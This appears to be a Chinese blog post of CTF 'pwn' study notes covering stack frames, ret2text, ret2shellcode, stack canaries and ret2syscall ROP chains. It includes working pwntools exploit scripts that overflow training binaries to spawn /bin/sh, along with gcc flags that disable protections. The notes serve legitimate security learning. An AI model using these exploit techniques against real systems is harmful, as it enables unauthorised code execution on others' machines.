---
layout: post
title: pwn学习笔记_1
categories: ctf
description: pwn基础
keywords: pwn
---
# pwn学习笔记

## 前置知识

程序调用栈：在用户空间最高地址的地方。从高地址向低地址增长

<img src="https://img1.imgtp.com/2023/09/14/Yc8HtShM.png" alt="栈位置" style="zoom:50%;" />

push 目标值压栈且SP指针-1字长(32bit/64bit)

pop目标值出栈且SP指针+1字长(32bit/64bit)

栈顶(最下面)对应的函数是正在执行的函数

bp指向当前栈帧的栈底，sp指向当前栈帧的栈顶

而当前栈底，也就是bp指向的位置，存放的是上一帧的栈底，因为返回时要让bp回到上一个函数栈底

ret就会pop到eip

bp上一个才是返回地址

![返回变化](https://img1.imgtp.com/2023/09/14/BI1eKKoU.png)

ctrl+shift+c复制 xor eax,eax; 把eax清空  (判断两个数是否为不一样的，eax存返回值，故此操作为清零eax)

在IDA中按G进行跳转地址  找/bin/sh按shift+Fn+F12后ctrl+F进行查找

## 1.ret2text

输入任意字符后

![调试](https://img1.imgtp.com/2023/09/14/QfmqCOsG.png)

可以看到eax也就是输入区域与ebp相差0x10--16字符 还需要覆盖ebp的4个字节(32位) 接着就可以输入想要返回的地址

![ret2text](https://img1.imgtp.com/2023/09/14/yVXGmMrm.png)

## 2.ret2shellcode(BSS写入)

checksec --file=ret2text

<img src="https://img1.imgtp.com/2023/09/14/tK1HvhZc.png" alt="checksec" style="zoom:67%;" />

只要ASLR打开就不可以在栈上写

输入的shellcode存在于栈或堆或bss缓冲区

bss默认有可执行权限 栈是否可执行看NS保护是否打开

ASLR地址随机化--每次载入栈地址都不同

/proc/sys/kernel/randomize_va_space

cat /proc/sys/kernel/randomize_va_space可以看到虚拟机地址随机化的程度

print(asm(shellcraft.sh()))转机器码 默认32位 要是攻击64位的print(asm(shellcraft.amd64.sh()))

查看虚拟内存的空间分布 看可读可写可执行区域

![vmmap](https://img1.imgtp.com/2023/09/14/BDkthcwJ.png)

下面看代码

<img src="https://img1.imgtp.com/2023/09/14/ZNatApOf.png" alt="主函数" style="zoom:67%;" />

函数的意思是将s中0x64长度拷入buf2中

虽然栈是可执行的但是ASLR默认打开，不知道远端服务器栈的位置无法执行可执行代码(写进去是可以的)

bss是固定的，可以获取地址且与远程一致   --》  使用shellcraft工具在bss代码段调用系统函数

可以看到，给出字符距离bp的长度

<img src="https://img1.imgtp.com/2023/09/14/hJjDemOL.png" alt="eg" style="zoom:67%;" />

如果两者出现错误，遵循动态调试的结果

下面进行动态调试

进行gdb调试，get之后写入栈中，查看栈的地址

<img src="https://img1.imgtp.com/2023/09/14/imeHfzU5.png" alt="查看栈" style="zoom:67%;" />

使用python3计算可得ebp-eax=108 与0x64不同，按照动态调试为准

108个垃圾数据加上ebp指针占4字节(32位)

下面书写payload

其中ljust是指左端数据不变一直向右补充某个数据(b'A')

```python
from pwn import *
io = process("./ret2shellcode")
#io = remote("106.54.129.202",10003)
buf2=0x804A080
payload=asm(shellcraft.sh()).ljust(112,b'A')+p32(buf2)
io.sendline(payload)
io.interactive()
```

![image-20230916165738954](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230916165738954.png)

![image-20230916171403860](C:\Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230916171403860.png)

## 3.ret2stack

canary防护措施 在ebp之前，先溢出到canary处再溢出到返回数据，由于溢出的是垃圾数据，将之前canary中的随机数据更改，canary检测到更改后就会退出当前程序。

```gcc
gcc -fno-stack-protector -z execstack -no-pie -g -o 执行文件 执行文件.c 
```

-fno-stack-protector 关闭canary      -z execstack 获得可执行权限     -no-pie关掉pie

## 4.ret2syscall(静态链接)

返回导向编程

ROPgadget --binary ret2syscall --only "pop|ret"

跟上要寻找的二进制文件 和要找的功能pop和ret

ROP动态过程

没有一步到位的地址来调用shell，在栈中写了一系列返回地址，在代码段连续跳转，所有gadget执行完后，最终系统调用本质上执行的kernel的代码

我们需要做的工作是

**mov eax, 0xb	mov ebx, [“/bin/sh”] 	mov ecx, 0	mov edx, 0	int 0x80	=>execve("/bin/sh",NULL,NULL)**

eax=0xb是因为系统调用号是0xb

先寻找有pop和ret指令的

![ROPgadget](https://img1.imgtp.com/2023/09/16/tAdMk9g5.png)

在IDA中按G进行跳转地址  找/bin/sh按shift+Fn+F12后ctrl+F进行查找

从局部变量写入pop的值和下一个返回地址和下一个pop的值和其他填充直到覆盖返回地址为第一个pop的地址

```bash
ROPgadget --binary ret2syscall --only "pop|ret" |grep eax
```

输出所有含有eax的pop,ret指令

![ROP1](https://img1.imgtp.com/2023/09/17/Q1Ql6xNY.png)

同样输出ebx的

![ROP2](https://img1.imgtp.com/2023/09/17/DF16uGre.png)

再查找int80的位置

```bash
ROPgadget --binary ret2syscall --only "int"
```

![ROP3](https://img1.imgtp.com/2023/09/17/LfgTN6Ov.png)

再寻找/bin/sh

从IDA中寻找

![IDA/bin/sh](https://img1.imgtp.com/2023/09/17/1NPC4ZGo.png)

或者在命令行中

```python
from pwn import *
elf = ELF("./ret2syscall")
hex(next(elf.search(b"/bin/sh")))
```

payload为

```python
from pwn import *
io = process("./ret2syscall")
eax=0xb
ebx=0x80BE408
ecx=0x0
edx=0x0
pop_eax_ret=0x80bb196
pop_edx_ecx_ebx_ret=0x806eb90
int_80h=0x8049421
io.recvline()
payload=flat([ b'A'*112,pop_eax_ret,eax,pop_edx_ecx_ebx_ret,edx,ecx,ebx,int_80h])
#flat list
io.sendline(payload)
io.interactive()
```

得到控制权

![final](https://img1.imgtp.com/2023/09/17/qryUd4zh.png)

图像加深理解：

![过程](https://img1.imgtp.com/2023/09/17/OCkAJ3Ur.png)

## 5.动态链接和静态链接

动态链接编译

gcc -fno-pie -o dytest test.c

静态链接编译

gcc -fno-pie --static -o statest test.c





